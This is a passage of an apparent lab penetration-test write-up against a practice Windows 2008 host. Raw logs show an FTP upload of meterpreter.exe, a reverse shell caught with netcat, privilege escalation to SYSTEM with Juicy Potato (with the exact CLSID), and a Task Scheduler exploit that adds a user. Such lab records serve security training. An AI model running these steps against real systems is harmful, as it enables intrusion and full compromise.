┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46                                                                                       
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put meterpreter.exe
local: meterpreter.exe remote: meterpreter.exe
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
73802 bytes sent in 0.34 secs (209.1161 kB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
┌──(kali㉿kali)-[~]
└─$ curl -u offsec:elite http://192.168.162.46:242/shell.php & sudo nc -nlvp 443
[1] 21989
listening on [any] 443 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.46] 49214
whoami
livda\apache
C:/wamp/www/meterpreter.exe

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                                                                                                                                               1 ⨯
listening on [any] 443 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.46] 49215
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>cd \Users\apache\Desktop
cd \Users\apache\Desktop

C:\Users\apache\Desktop>type local.txt
type local.txt
c4a90f5b5107c7fff4ccb27063df303c

C:\Users\apache\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7c01:357:54d5:4173%12
   IPv4 Address. . . . . . . . . . . : 192.168.162.46
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.162.254

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 2:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\apache\Desktop>

```

![](Pasted%20image%2020220129152037.png)

# Privesc
```
C:\Users\apache\Desktop>whoami /priv 
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Users\apache\Desktop>
```

```
C:\wamp\www>systeminfo
systeminfo

Host Name:                 LIVDA
OS Name:                   Microsoftr Windows Serverr 2008 Standard 
OS Version:                6.0.6001 Service Pack 1 Build 6001
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                92573-OEM-7502905-27565
Original Install Date:     12/19/2009, 11:25:57 AM
System Boot Time:          1/28/2022, 7:26:30 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,644 MB
Page File: Max Size:       1,985 MB
Page File: Available:      1,522 MB
Page File: In Use:         463 MB
Page File Location(s):     N/A
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           N/A

C:\wamp\www>
```

## Churrasco Test

```                                                                                            
┌──(kali㉿kali)-[/tmp]
└─$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe                                                                                               1 ⚙
--2022-01-29 02:45:29--  https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/Re4son/Churrasco/master/churrasco.exe [following]
--2022-01-29 02:45:30--  https://raw.githubusercontent.com/Re4son/Churrasco/master/churrasco.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31232 (30K) [application/octet-stream]
Saving to: ‘churrasco.exe’

churrasco.exe                             100%[=====================================================================================>]  30.50K  --.-KB/s    in 0.002s  

2022-01-29 02:45:30 (16.9 MB/s) - ‘churrasco.exe’ saved [31232/31232]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46                                                                                                                                              1 ⚙
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put churrasco.exe
local: churrasco.exe remote: churrasco.exe
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
31232 bytes sent in 0.00 secs (372.3145 MB/s)
ftp> 
```

```
C:\wamp\www>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\wamp\www

01/28/2022  11:44 PM    <DIR>          .
01/28/2022  11:44 PM    <DIR>          ..
11/08/2011  07:58 AM               161 .htaccess
11/08/2011  07:53 AM                45 .htpasswd
01/28/2022  11:44 PM            31,232 churrasco.exe
11/08/2011  07:45 AM                76 index.php
01/28/2022  11:09 PM            73,802 meterpreter.exe
01/28/2022  10:59 PM             3,011 shell.php
               6 File(s)        108,327 bytes
               2 Dir(s)   5,951,016,960 bytes free

C:\wamp\www>churrasco.exe -d "C:\wamp\www\meterpreter.exe"
churrasco.exe -d "C:\wamp\www\meterpreter.exe"
/churrasco/-->Current User: apache 
/churrasco/-->Process is not running under NETWORK SERVICE account!
/churrasco/-->Getting NETWORK SERVICE token ...
/churrasco/-->Couldn't find NETWORK SERVICE token

C:\wamp\www>

```

## Juicy Potato

https://github.com/ivanitlearning/Juicy-Potato-x86/releases

```
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe                                                              1 ⚙
--2022-01-29 03:21:03--  https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/196702598/c8e88800-ed5b-11e9-89ca-5a5dd8d9086a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220129%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220129T082102Z&X-Amz-Expires=300&X-Amz-Signature=59b1c9164c1d9d599a748bc6347e04f9c4ca6731bcbb0d301172e7f5b9e56bf2&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=196702598&response-content-disposition=attachment%3B%20filename%3DJuicy.Potato.x86.exe&response-content-type=application%2Foctet-stream [following]
--2022-01-29 03:21:03--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/196702598/c8e88800-ed5b-11e9-89ca-5a5dd8d9086a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220129%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220129T082102Z&X-Amz-Expires=300&X-Amz-Signature=59b1c9164c1d9d599a748bc6347e04f9c4ca6731bcbb0d301172e7f5b9e56bf2&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=196702598&response-content-disposition=attachment%3B%20filename%3DJuicy.Potato.x86.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 263680 (258K) [application/octet-stream]
Saving to: ‘Juicy.Potato.x86.exe’

Juicy.Potato.x86.exe                      100%[=====================================================================================>] 257.50K   291KB/s    in 0.9s    

2022-01-29 03:21:05 (291 KB/s) - ‘Juicy.Potato.x86.exe’ saved [263680/263680]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ ftp 192.168.162.46                                                                                                                                              1 ⚙
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put Juicy.Potato.x86.exe
local: Juicy.Potato.x86.exe remote: Juicy.Potato.x86.exe
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
263680 bytes sent in 0.52 secs (496.4449 kB/s)
ftp> put test_clsid.bat
local: test_clsid.bat remote: test_clsid.bat
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
285 bytes sent in 0.00 secs (6.4714 MB/s)
ftp> 

```

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Guess the CSLID from here
http://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/


```
C:\wamp\www>Juicy.Potato.x86.exe -l 3333 -t * -p meterpreter.exe -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Juicy.Potato.x86.exe -l 3333 -t * -p meterpreter.exe -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
Testing {69AD4AEE-51BE-439b-A92C-86AE490E8B30} 3333
....
[+] authresult 0
{69AD4AEE-51BE-439b-A92C-86AE490E8B30};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\wamp\www>

```


```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                                                                                                                                               1 ⨯
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.46] 49234
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \Users\Administrator\Desktop
cd \Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
39ab385c0db0871ab7468c28f7674f04

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7c01:357:54d5:4173%12
   IPv4 Address. . . . . . . . . . . : 192.168.162.46
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.162.254

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 2:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\Administrator\Desktop>

```

![](Pasted%20image%2020220129163423.png)
# Others

```
┌──(kali㉿kali)-[~/Documents]
└─$ python windows-exploit-suggester.py --database 2021-10-09-mssb.xls --systeminfo /tmp/test.txt 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 5 potential bulletins(s) with a database of 137 known exploits
[*] there are now 5 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 SP1 32-bit'
[*] 
[*] done
                
```

Other Privesc

```
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ searchsploit -m 15589                                                                                                                                           1 ⚙
  Exploit: Microsoft Windows - Task Scheduler Privilege Escalation
      URL: https://www.exploit-db.com/exploits/15589
     Path: /usr/share/exploitdb/exploits/windows/local/15589.wsf
File Type: HTML document, ASCII text

Copied to: /tmp/Lovely-Potato/15589.wsf


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ ftp                                                                                                                                                             1 ⚙
ftp> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/Lovely-Potato]
└─$ ftp 192.168.162.46                                                                                                                                              1 ⚙
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put 15589.wsf
local: 15589.wsf remote: 15589.wsf
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
9333 bytes sent in 0.00 secs (87.2612 MB/s)
ftp> 

```

```
C:\wamp\www>net users
net users

User accounts for \\LIVDA

-------------------------------------------------------------------------------
Administrator            apache                   Guest                    
The command completed successfully.


C:\wamp\www>
C:\wamp\www>cscript 15589.wsf
cscript 15589.wsf
Microsoft (R) Windows Script Host Version 5.7
Copyright (C) Microsoft Corporation. All rights reserved.

 Task Scheduler 0 day - Privilege Escalation 
 Should work on Vista/Win7/2008 x86/x64
 webDEViL - w3bd3vil [at] gmail [dot] com

Crc32 Original: BA07E27E
Crc32 Magic Bytes: 60A2D3D6
Crc32 Forged: BA07E27E

C:\wamp\www>net users
net users

User accounts for \\LIVDA

-------------------------------------------------------------------------------
Administrator            apache                   Guest                    
test123                  
The command completed successfully.


C:\wamp\www>

```

Login using rdesktop

![](Pasted%20image%2020220129165500.png)